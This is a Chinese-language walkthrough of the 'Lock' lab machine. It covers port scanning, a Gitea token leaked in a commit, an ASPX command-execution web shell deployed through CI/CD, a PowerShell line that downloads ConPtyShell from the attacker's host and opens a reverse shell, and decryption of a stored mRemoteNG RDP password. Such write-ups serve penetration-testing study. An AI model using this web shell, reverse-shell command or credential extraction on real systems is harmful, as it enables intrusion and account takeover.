+<meta property="og:url" content="https://faabbi.github.io/post/Lock.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>Lock</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Lock</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/33" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 10000 -p- 10.129.234.64</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
+Nmap scan report <span class="pl-k">for</span> 10.129.234.64 (10.129.234.64)
+Host is up (0.17s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+445/tcp  open  microsoft-ds
+3000/tcp open  ppp
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 13.77 seconds
+
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -O -p80,445,3000,3389 10.129.234.64</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
+Nmap scan report <span class="pl-k">for</span> 10.129.234.64 (10.129.234.64)
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+<span class="pl-k">|</span> http-methods:
+<span class="pl-k">|</span>_  Potentially risky methods: TRACE
+<span class="pl-k">|</span>_http-title: Lock - Index
+<span class="pl-k">|</span>_http-server-header: Microsoft-IIS/10.0
+445/tcp  open  microsoft-ds<span class="pl-k">?</span>
+3000/tcp open  http          Golang net/http server
+<span class="pl-k">|</span>_http-title: Gitea: Git with a cup of tea
+<span class="pl-k">|</span> fingerprint-strings:
+<span class="pl-k">|</span>   GenericLines, Help, RTSPRequest:
+<span class="pl-k">|</span>     HTTP/1.1 400 Bad Request
+<span class="pl-k">|</span>     Content-Type: text/plain<span class="pl-k">;</span> charset=utf-8
+<span class="pl-k">|</span>     Connection: close
+<span class="pl-k">|</span>     Request
+<span class="pl-k">|</span>   GetRequest:
+<span class="pl-k">|</span>     HTTP/1.0 200 OK
+<span class="pl-k">|</span>     Cache-Control: max-age=0, private, must-revalidate, no-transform
+<span class="pl-k">|</span>     Content-Type: text/html<span class="pl-k">;</span> charset=utf-8
+<span class="pl-k">|</span>     Set-Cookie: i_like_gitea=a865c00922d0321f<span class="pl-k">;</span> Path=/<span class="pl-k">;</span> HttpOnly<span class="pl-k">;</span> SameSite=Lax
+<span class="pl-k">|</span>     Set-Cookie: _csrf=1qqwoFwYj7mnLM1dUF-dAWixUxw6MTc2NDkwODQzODU5OTY1NzAwMA<span class="pl-k">;</span> Path=/<span class="pl-k">;</span> Max-Age=86400<span class="pl-k">;</span> HttpOnly<span class="pl-k">;</span> SameSite=Lax
+<span class="pl-k">|</span>     X-Frame-Options: SAMEORIGIN
+<span class="pl-k">|</span>     Date: Fri, 05 Dec 2025 04:20:38 GMT
+<span class="pl-k">|</span>     <span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
+<span class="pl-k">|</span>     <span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>en-US<span class="pl-pds">"</span></span> class=<span class="pl-s"><span class="pl-pds">"</span>theme-auto<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+<span class="pl-k">|</span>     <span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+<span class="pl-k">|</span>     <span class="pl-k">&lt;</span>meta name=<span class="pl-s"><span class="pl-pds">"</span>viewport<span class="pl-pds">"</span></span> content=<span class="pl-s"><span class="pl-pds">"</span>width=device-width, initial-scale=1<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+<span class="pl-k">|</span>     <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Gitea: Git with a cup of tea<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
+<span class="pl-k">|</span>     <span class="pl-k">&lt;</span>link rel=<span class="pl-s"><span class="pl-pds">"</span>manifest<span class="pl-pds">"</span></span> href=<span class="pl-s"><span class="pl-pds">"</span>data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU</span>
+<span class="pl-s">|   HTTPOptions:</span>
+<span class="pl-s">|     HTTP/1.0 405 Method Not Allowed</span>
+<span class="pl-s">|     Allow: HEAD</span>
+<span class="pl-s">|     Allow: GET</span>
+<span class="pl-s">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span>
+<span class="pl-s">|     Set-Cookie: i_like_gitea=8d992280eb14793f; Path=/; HttpOnly; SameSite=Lax</span>
+<span class="pl-s">|     Set-Cookie: _csrf=D4r1ealHN8sJRRAbJCv0_SM0E086MTc2NDkwODQzOTQ4MzA5NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span>
+<span class="pl-s">|     X-Frame-Options: SAMEORIGIN</span>
+<span class="pl-s">|     Date: Fri, 05 Dec 2025 04:20:39 GMT</span>
+<span class="pl-s">|_    Content-Length: 0</span>
+<span class="pl-s">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span>
+<span class="pl-s">| rdp-ntlm-info:</span>
+<span class="pl-s">|   Target_Name: LOCK</span>
+<span class="pl-s">|   NetBIOS_Domain_Name: LOCK</span>
+<span class="pl-s">|   NetBIOS_Computer_Name: LOCK</span>
+<span class="pl-s">|   DNS_Domain_Name: Lock</span>
+<span class="pl-s">|   DNS_Computer_Name: Lock</span>
+<span class="pl-s">|   Product_Version: 10.0.20348</span>
+<span class="pl-s">|_  System_Time: 2025-12-05T04:21:10+00:00</span>
+<span class="pl-s">|_ssl-date: 2025-12-05T04:21:49+00:00; -2s from scanner time.</span>
+<span class="pl-s">| ssl-cert: Subject: commonName=Lock</span>
+<span class="pl-s">| Not valid before: 2025-12-04T04:18:57</span>
+<span class="pl-s">|_Not valid after:  2026-06-05T04:18:57</span>
+<span class="pl-s">1 service unrecognized despite returning data.</span>
+<span class="pl-s">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span>
+<span class="pl-s">Device type: general purpose</span>
+<span class="pl-s">Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)</span>
+<span class="pl-s">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016</span>
+<span class="pl-s">Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)</span>
+<span class="pl-s">No exact OS matches for host (test conditions non-ideal).</span>
+<span class="pl-s">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+<span class="pl-s"></span>
+<span class="pl-s">Host script results:</span>
+<span class="pl-s">|_clock-skew: mean: -1s, deviation: 0s, median: -1s</span>
+<span class="pl-s">| smb2-security-mode:</span>
+<span class="pl-s">|   3:1:1:</span>
+<span class="pl-s">|_    Message signing enabled but not required</span>
+<span class="pl-s">| smb2-time:</span>
+<span class="pl-s">|   date: 2025-12-05T04:21:11</span>
+<span class="pl-s">|_  start_date: N/A</span>
+<span class="pl-s"></span>
+<span class="pl-s">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="pl-s">Nmap done: 1 IP address (1 host up) scanned in 79.66 seconds</span></pre></div>
+<p>可以看到开放了Web(80,3000)，smb(445)，rpc(3389)，基本可以确定这是台windows机器</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> curl 10.129.234.64                                                       </span>
+  <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- =======================================================
+  <span class="pl-k">*</span> Template Name: Gp
+  <span class="pl-k">*</span> Updated: Nov 25 2023 with Bootstrap v5.3.2
+  <span class="pl-k">*</span> Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/
+  <span class="pl-k">*</span> Author: BootstrapMade.com
+  <span class="pl-k">*</span> License: https://bootstrapmade.com/license/
+  ======================================================== --<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span></pre></div>
+<p>curl一下目标靶机，可以看到bootstrap框架，见过的都了解这是个前端框架，没有什么利用价值</p>
+<p>在3000端口下可以找到历史版的脚本<code class="notranslate">http://10.129.234.64:3000/ellen.freeman/dev-scripts/commit/dcc869b175a47ff2a2b8171cda55cb82dbddff3d</code></p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">requests</span>
+<span class="pl-k">import</span> <span class="pl-s1">sys</span>
+
+<span class="pl-c"># store this in env instead at some point</span>
+<span class="pl-c1">PERSONAL_ACCESS_TOKEN</span> <span class="pl-c1">=</span> <span class="pl-s">'43ce39bb0bd6bc489284f2905f033ca467a6362f'</span>
+
+<span class="pl-k">def</span> <span class="pl-en">format_domain</span>(<span class="pl-s1">domain</span>):
+    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">domain</span>.<span class="pl-c1">startswith</span>((<span class="pl-s">'http://'</span>, <span class="pl-s">'https://'</span>)):
+        <span class="pl-s1">domain</span> <span class="pl-c1">=</span> <span class="pl-s">'https://'</span> <span class="pl-c1">+</span> <span class="pl-s1">domain</span>
+    <span class="pl-k">return</span> <span class="pl-s1">domain</span>
+
+<span class="pl-k">def</span> <span class="pl-en">get_repositories</span>(<span class="pl-s1">token</span>, <span class="pl-s1">domain</span>):
+    <span class="pl-s1">headers</span> <span class="pl-c1">=</span> {
+        <span class="pl-s">'Authorization'</span>: <span class="pl-s">f'token <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">token</span><span class="pl-kos">}</span></span>'</span>
+    }
+    <span class="pl-s1">url</span> <span class="pl-c1">=</span> <span class="pl-s">f'<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">domain</span><span class="pl-kos">}</span></span>/api/v1/user/repos'</span>
+    <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">get</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span><span class="pl-c1">=</span><span class="pl-s1">headers</span>)
+
+    <span class="pl-k">if</span> <span class="pl-s1">response</span>.<span class="pl-c1">status_code</span> <span class="pl-c1">==</span> <span class="pl-c1">200</span>:
+        <span class="pl-k">return</span> <span class="pl-s1">response</span>.<span class="pl-c1">json</span>()
+    <span class="pl-k">else</span>:
+        <span class="pl-k">raise</span> <span class="pl-en">Exception</span>(<span class="pl-s">f'Failed to retrieve repositories: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">response</span>.<span class="pl-c1">status_code</span><span class="pl-kos">}</span></span>'</span>)
+
+<span class="pl-k">def</span> <span class="pl-en">main</span>():
+    <span class="pl-k">if</span> <span class="pl-en">len</span>(<span class="pl-s1">sys</span>.<span class="pl-c1">argv</span>) <span class="pl-c1">&lt;</span> <span class="pl-c1">2</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">"Usage: python script.py &lt;gitea_domain&gt;"</span>)
+        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+
+    <span class="pl-s1">gitea_domain</span> <span class="pl-c1">=</span> <span class="pl-en">format_domain</span>(<span class="pl-s1">sys</span>.<span class="pl-c1">argv</span>[<span class="pl-c1">1</span>])
+
+    <span class="pl-k">try</span>:
+        <span class="pl-s1">repos</span> <span class="pl-c1">=</span> <span class="pl-en">get_repositories</span>(<span class="pl-c1">PERSONAL_ACCESS_TOKEN</span>, <span class="pl-s1">gitea_domain</span>)
+        <span class="pl-en">print</span>(<span class="pl-s">"Repositories:"</span>)
+        <span class="pl-k">for</span> <span class="pl-s1">repo</span> <span class="pl-c1">in</span> <span class="pl-s1">repos</span>:
+            <span class="pl-en">print</span>(<span class="pl-s">f"- <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">repo</span>[<span class="pl-s">'full_name'</span>]<span class="pl-kos">}</span></span>"</span>)
+    <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s">f"Error: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">e</span><span class="pl-kos">}</span></span>"</span>)
+
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-en">main</span>()</pre></div>
+<p>可以看到<strong>PERSONAL_ACCESS_TOKEN</strong>被硬编码了，在新版脚本中，从环境变量读取凭据，然后列出仓库</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f                                                       </span>
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> vim ez.py</span>
+
+┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> python3 ez.py http://10.129.234.64:3000</span>
+Repositories:
+- ellen.freeman/dev-scripts
+- ellen.freeman/website
+列出了仓库</pre></div>
+<p>一个是3000端口部署的，一个是80部署的</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/dev-scripts.git
+
+git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git</pre></div>
+<p>如果未知用户名可以直接使用<code class="notranslate">http://&lt;PAT&gt;@ip:port/&lt;REPO_FULL_NAME&gt;.git</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/website]
+└─<span class="pl-c"><span class="pl-c">#</span> cat changelog.txt&amp;&amp; cat readme.md</span>
+<span class="pl-c"><span class="pl-c">#</span> Changelog</span>
+
+- Added first website version
+<span class="pl-c"><span class="pl-c">#</span> New Project Website</span>
+
+CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver</pre></div>
+<h1>Web</h1>
+<p>可以看到提示，存储库的改变会被自动推送到网站上，所以可以写个windows的木马推上去</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test/website]
+└─<span class="pl-c"><span class="pl-c">#</span> cat shell.aspx</span>
+<span class="pl-k">&lt;</span>%@ Page Language=<span class="pl-s"><span class="pl-pds">"</span>C#<span class="pl-pds">"</span></span>%<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>%@ Import Namespace=<span class="pl-s"><span class="pl-pds">"</span>System.Diagnostics<span class="pl-pds">"</span></span>%<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>%@ Import Namespace=<span class="pl-s"><span class="pl-pds">"</span>System.IO<span class="pl-pds">"</span></span>%<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>script language=<span class="pl-s"><span class="pl-pds">"</span>C#<span class="pl-pds">"</span></span> runat=<span class="pl-s"><span class="pl-pds">"</span>server<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    void Page_Load(object sender, EventArgs e) {
+        string cmd = Request.QueryString[<span class="pl-s"><span class="pl-pds">"</span>cmd<span class="pl-pds">"</span></span>]<span class="pl-k">;</span>
+        <span class="pl-k">if</span> (<span class="pl-k">!</span>string.IsNullOrEmpty(cmd)) {
+            Process p = new <span class="pl-en">Process</span>();
+            p.StartInfo.FileName = <span class="pl-s"><span class="pl-pds">"</span>cmd.exe<span class="pl-pds">"</span></span><span class="pl-k">;</span>
+            p.StartInfo.Arguments = <span class="pl-s"><span class="pl-pds">"</span>/c <span class="pl-pds">"</span></span> + cmd<span class="pl-k">;</span>
+            p.StartInfo.UseShellExecute = <span class="pl-c1">false</span><span class="pl-k">;</span>
+            p.StartInfo.RedirectStandardOutput = <span class="pl-c1">true</span><span class="pl-k">;</span>
+            p.StartInfo.RedirectStandardError = <span class="pl-c1">true</span><span class="pl-k">;</span>
+            <span class="pl-en">p.Start</span>();
+            string output = <span class="pl-en">p.StandardOutput.ReadToEnd</span>();
+            output += <span class="pl-en">p.StandardError.ReadToEnd</span>();
+            <span class="pl-en">p.WaitForExit</span>();
+            Response.Write(<span class="pl-s"><span class="pl-pds">"</span>&lt;pre&gt;<span class="pl-pds">"</span></span> + output + <span class="pl-s"><span class="pl-pds">"</span>&lt;/pre&gt;<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+        }
+    }
+<span class="pl-k">&lt;</span>/script<span class="pl-k">&gt;</span>
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─<span class="pl-c"><span class="pl-c">#</span> git add shell.aspx</span>
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─<span class="pl-c"><span class="pl-c">#</span> git commit -m "Added shell.aspx for temporary debugging"</span>
+[main 9733d61] Added shell.aspx <span class="pl-k">for</span> temporary debugging
+ Committer: root <span class="pl-k">&lt;</span>root@MJ.localdomain<span class="pl-k">&gt;</span>
+Your name and email address were configured automatically based
+on your username and hostname. Please check that they are accurate.
+You can suppress this message by setting them explicitly. Run the
+following <span class="pl-c1">command</span> and follow the instructions <span class="pl-k">in</span> your editor to edit
+your configuration file:
+
+    git config --global --edit
+
+After doing this, you may fix the identity used <span class="pl-k">for</span> this commit with:
+
+    git commit --amend --reset-author
+
+ 1 file changed, 21 insertions(+)
+ create mode 100644 shell.aspx
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─<span class="pl-c"><span class="pl-c">#</span> git push</span>
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 20 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 663 bytes <span class="pl-k">|</span> 663.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: <span class="pl-c1">.</span> Processing 1 references
+remote: Processed 1 references <span class="pl-k">in</span> total
+To http://10.129.234.64:3000/ellen.freeman/website.git
+   73cdcc1..9733d61  main -<span class="pl-k">&gt;</span> main
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://10.129.234.64/shell.aspx?cmd=whoami</span>
+<span class="pl-k">&lt;</span>pre<span class="pl-k">&gt;</span>lock<span class="pl-cce">\e</span>llen.freeman
+<span class="pl-k">&lt;</span>/pre<span class="pl-k">&gt;</span>                                                                       </pre></div>
+<h1>提权</h1>
+<p>交互式shell</p>
+<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c1">New-Item</span> <span class="pl-k">-</span>Path C:\temp <span class="pl-k">-</span>Type Directory <span class="pl-k">-</span>Force; (<span class="pl-c1">New-Object</span> System.Net.WebClient).DownloadFile(<span class="pl-s"><span class="pl-pds">'</span>http://10.10.16.15:8000/ConPtyShell.exe<span class="pl-pds">'</span></span><span class="pl-k">,</span><span class="pl-s"><span class="pl-pds">'</span>C:\temp\ConPtyShell.exe<span class="pl-pds">'</span></span>); C:\temp\<span class="pl-c1">ConPtyShell.exe</span> <span class="pl-c1">10.10</span>.<span class="pl-c1">16.15</span> <span class="pl-c1">2332</span></pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl <span class="pl-s"><span class="pl-pds">'</span>http://10.129.234.64/shell.aspx?cmd=powershell.exe%20-c%20%22New-Item%20-Path%20C%3A%5Ctemp%20-Type%20Directory%20-Force%3B%20(New-Object%20System.Net.WebClient).DownloadFile(%27http%3A%2F%2F10.10.16.15%3A8000%2FConPtyShell.exe%27%2C%27C%3A%5Ctemp%5CConPtyShell.exe%27)%3B%20C%3A%5Ctemp%5CConPtyShell.exe%2010.10.16.15%202332%22<span class="pl-pds">'</span></span></pre></div>
+<p>在document目录下发现config.xml</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[~/…/Linux/vshell/download/2]
+└─<span class="pl-c"><span class="pl-c">#</span> cat config.xml</span>
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> encoding=<span class="pl-s"><span class="pl-pds">"</span>utf-8<span class="pl-pds">"</span></span><span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>mrng:Connections xmlns:mrng=<span class="pl-s"><span class="pl-pds">"</span>http://mremoteng.org<span class="pl-pds">"</span></span> Name=<span class="pl-s"><span class="pl-pds">"</span>Connections<span class="pl-pds">"</span></span> Export=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> EncryptionEngine=<span class="pl-s"><span class="pl-pds">"</span>AES<span class="pl-pds">"</span></span> BlockCipherMode=<span class="pl-s"><span class="pl-pds">"</span>GCM<span class="pl-pds">"</span></span> KdfIterations=<span class="pl-s"><span class="pl-pds">"</span>1000<span class="pl-pds">"</span></span> FullFileEncryption=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> Protected=<span class="pl-s"><span class="pl-pds">"</span>sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp<span class="pl-pds">"</span></span> ConfVersion=<span class="pl-s"><span class="pl-pds">"</span>2.6<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    &lt;Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" /&gt;
+<span class="pl-k">&lt;</span>/mrng:Connections<span class="pl-k">&gt;</span></pre></div>
+<p>这是<code class="notranslate">mRemoteNG</code> 远程桌面管理工具<strong>的配置文件</strong></p>
+<h2>🔑 敏感信息分析</h2>
+<markdown-accessiblity-table><table role="table">
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>含义</strong></th>
+<th><strong>价值</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code class="notranslate">xmlns:mrng="http://mremoteng.org"</code></td>
+<td>确认这是 <code class="notranslate">mRemoteNG</code> 软件的配置文件。</td>
+<td>软件识别</td>
+</tr>
+<tr>
+<td><code class="notranslate">Username="Gale.Dekarios"</code></td>
+<td>存储了连接的用户名。</td>
+<td><strong>新用户凭证</strong></td>
+</tr>
+<tr>
+<td><code class="notranslate">Hostname="Lock"</code></td>
+<td>目标主机名（很可能就是您当前机器的名称，或另一个需要 RDP 连接的主机）。</td>
+<td>目标定位</td>
+</tr>
+<tr>
+<td><code class="notranslate">Protocol="RDP"</code></td>
+<td>连接类型是 <strong>远程桌面协议 (RDP)</strong>。</td>
+<td>攻击方向</td>
+</tr>
+<tr>
+<td><code class="notranslate">Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=="</code></td>
+<td><strong>加密的密码</strong>。这是提权的关键目标。</td>
+<td><strong>最高价值</strong></td>
+</tr>
+<tr>
+<td><code class="notranslate">EncryptionEngine="AES"</code></td>
+<td>使用 <strong>AES</strong> (高级加密标准) 加密。</td>
+<td>破解线索</td>
+</tr>
+<tr>
+<td><code class="notranslate">BlockCipherMode="GCM"</code></td>
+<td>使用 <strong>GCM</strong> (Galois/Counter Mode) 块密码模式。</td>
+<td>破解线索</td>
+</tr>
+<tr>
+<td><code class="notranslate">Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp"</code></td>
+<td>这是一个<strong>主密钥</strong>，用于保护文件中的所有敏感数据。</td>
+<td>破解线索</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p>用py脚本进行解密</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> python3 mRemoteNG.py -rf config.xml</span>
+Username: Gale.Dekarios
+Hostname: Lock
+Password: ty8wnW9qCKDosXo6</pre></div>
+<h3>脚本</h3>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
+
